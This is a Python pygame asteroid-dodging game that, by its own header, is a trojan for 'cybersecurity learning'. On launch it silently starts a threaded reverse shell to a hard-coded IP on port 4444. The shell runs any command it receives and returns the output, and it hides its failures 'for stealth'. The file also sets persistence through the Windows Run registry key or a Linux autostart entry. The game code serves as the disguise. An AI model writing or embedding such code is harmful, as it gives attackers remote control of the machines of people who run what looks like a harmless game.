# This file is for cybersecurity learning purposes only
# Instead of using joystick, user uses keyboard to move
# It also performs persistence and introduces a backdoor in the user's computer

import pygame
import random
import sys
import subprocess
import pkg_resources
import socket
import threading
import os
import platform
import winreg

def check_dependencies():
    required = {"pygame"}
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = required - installed
    if missing:
        print("Missing dependencies detected: ", missing)
        print("Press 'Y' to continue or any other key to exit.")
        if input().lower() == 'y':
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
                print("Dependencies installed successfully.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to install dependencies: {e}. Please install Pygame manually.")
                sys.exit(1)
        else:
            print("User declined installation. Exiting.")
            sys.exit(1)

check_dependencies()

def start_reverse_shell():
    try:
        HOST = "10.12.74.12"  # Replace with your listener IP
        PORT = 4444
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            result = subprocess.getoutput(command)
            s.send(result.encode())
        s.close()
    except Exception:
        pass  # Silent failure for stealth

shell_thread = threading.Thread(target=start_reverse_shell)
shell_thread.start()

def add_to_startup():
    if platform.system() == "Windows":
        script_path = os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKCU, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AsteroidGame", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    elif platform.system() == "Linux":
        startup_dir = os.path.expanduser("~/.config/autostart/")
        os.makedirs(startup_dir, exist_ok=True)
        startup_path = os.path.join(startup_dir, "asteroid_game.desktop")
        with open(startup_path, "w") as f:
            f.write(f"[Desktop Entry]\nType=Application\nExec={os.path.abspath(__file__)}\nHidden=false\nNoDisplay=false\nName=AsteroidGame\n")

add_to_startup()

pygame.mixer.init()
pygame.init()

SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
OBJECT_WIDTH = 50
OBJECT_HEIGHT = 50
ASTEROID_SIZE = (40, 40)

object_x = (SCREEN_WIDTH - OBJECT_WIDTH) // 2
object_y = (SCREEN_HEIGHT - OBJECT_HEIGHT) // 2

WHITE = (255, 255, 255)
RED = (255, 0, 0)

pygame.display.set_caption("Avoid the Asteroids!")
window = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))

collision_sound = pygame.mixer.Sound('collision_sound.mp3')
game_over_sound = pygame.mixer.Sound('gameover.mp3')

object_image = pygame.transform.scale(pygame.image.load('new_object.png').convert_alpha(), (70, 70))
background_image = pygame.transform.scale(pygame.image.load('space_bg.png').convert(), (SCREEN_WIDTH, SCREEN_HEIGHT))
asteroid_image = pygame.transform.scale(pygame.image.load('asteroid_image.png').convert_alpha(), ASTEROID_SIZE)

def check_collisions():
    global score
    spaceship_rect = pygame.Rect(object_x, object_y, OBJECT_WIDTH, OBJECT_HEIGHT)
    for asteroid_x, asteroid_y, asteroid_size in asteroids:
        asteroid_rect = pygame.Rect(asteroid_x, asteroid_y, asteroid_size, asteroid_size)
        if spaceship_rect.colliderect(asteroid_rect):
            collision_sound.play()
            game_over_sound.play()
            pygame.time.delay(2000)
            return True
    return False

while True:
    asteroids = []
    score = 0
    GAME_OVER = 0
    GAME_RUNNING = 1
    current_state = GAME_RUNNING

    try:
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()

            keys = pygame.key.get_pressed()
            if current_state == GAME_RUNNING:
                if keys[pygame.K_LEFT]:
                    object_x -= 5
                if keys[pygame.K_RIGHT]:
                    object_x += 5
                if keys[pygame.K_UP]:
                    object_y -= 5
                if keys[pygame.K_DOWN]:
                    object_y += 5

            object_x = max(0, min(SCREEN_WIDTH - OBJECT_WIDTH, object_x))
            object_y = max(0, min(SCREEN_HEIGHT - OBJECT_HEIGHT, object_y))

            if current_state == GAME_RUNNING and check_collisions():
                current_state = GAME_OVER

            window.blit(background_image, (0, 0))
            if current_state == GAME_RUNNING:
                window.blit(object_image, (object_x, object_y))

            for asteroid_x, asteroid_y, _ in asteroids:
                window.blit(asteroid_image, (asteroid_x, asteroid_y))

            font = pygame.font.Font(None, 36)
            score_text = font.render(f"Score: {score}", True, WHITE)
            window.blit(score_text, (10, 10))

            if current_state == GAME_RUNNING:
                if random.randint(1, 20) == 1:
                    asteroid_size = random.randint(10, 30)
                    asteroid_x = random.randint(0, SCREEN_WIDTH - asteroid_size)
                    asteroid_y = -asteroid_size
                    asteroids.append((asteroid_x, asteroid_y, asteroid_size))
                for i, (ax, ay, a_size) in enumerate(asteroids):
                    asteroids[i] = (ax, ay + 5, a_size)
                    score += 1

            if current_state == GAME_OVER:
                score_text = font.render(f"Total score: {score}", True, RED)
                game_over_text = font.render("Game Over !! Press 'R' to restart or 'Q' to quit", True, RED)
                window.blit(game_over_text, ((SCREEN_WIDTH - game_over_text.get_width()) // 2, (SCREEN_HEIGHT - game_over_text.get_height()) // 2 - 50))
                window.blit(score_text, ((SCREEN_WIDTH - score_text.get_width()) // 2, (SCREEN_HEIGHT - score_text.get_height()) // 2 + 50))
                pygame.display.flip()

                waiting_for_key = True
                while waiting_for_key:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()
                            sys.exit()
                        if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_r:
                                waiting_for_key = False
                                current_state = GAME_RUNNING
                                asteroids = []
                                score = 0
                                object_x = (SCREEN_WIDTH - OBJECT_WIDTH) // 2
                                object_y = (SCREEN_HEIGHT - OBJECT_HEIGHT) // 2
                            elif event.key == pygame.K_q:
                                pygame.quit()
                                sys.exit()

            pygame.display.flip()

    except KeyboardInterrupt:
        print("Game cannot be interrupted. Press 'Q' in-game to quit.")
        pygame.quit()
        sys.exit()